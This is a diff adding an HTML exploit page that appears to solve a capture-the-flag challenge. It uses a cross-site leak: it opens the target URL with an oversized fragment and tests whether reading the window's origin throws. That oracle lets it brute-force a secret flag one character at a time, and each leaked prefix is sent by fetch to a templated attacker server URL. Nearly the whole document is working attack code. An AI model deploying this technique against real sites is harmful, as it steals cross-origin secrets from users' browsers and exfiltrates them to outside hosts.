@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.min.js"></script>
+</head>
+<body>
+    <script>
+        const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{|}~'
+
+        const leak = async (url) => {
+            let w = window.open(url + "#" + "A".repeat(2 * 1024 * 1024 - url.length - 2));
+            await sleep(800);
+            try {
+                w.origin;
+                await w.close();
+                return 0;
+            } catch {
+                await w.close();
+                return 1;
+            }
+        }
+
+        const solve = async (char) => {
+            const leaked = await leak(`<%= CHALL %>?q=${flag.slice(-3) + char}`);
+            if (leaked) {
+                flag += char;
+                await fetch(`<%= OUR_URL %>?flag=${flag}`);
+                return true;
+            }
+            return false;
+        }
+
+        const main = async () => {
+            let promises = [];
+            while (true) {
+                for (let c of charset) {
+                    promises.push(solve(c));
+                    if (promises.length === 40 || charset.indexOf(c) === charset.length - 1) {
+                        const results = await Promise.all(promises);
+                        promises = [];
+                    }
+                }
+            }
+        };
+
+        
+
+        async function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        console.log(`Running...`);
+        let flag = Cookies.get("flag");
+        main();
+
+    </script>
+</body>
+</html>
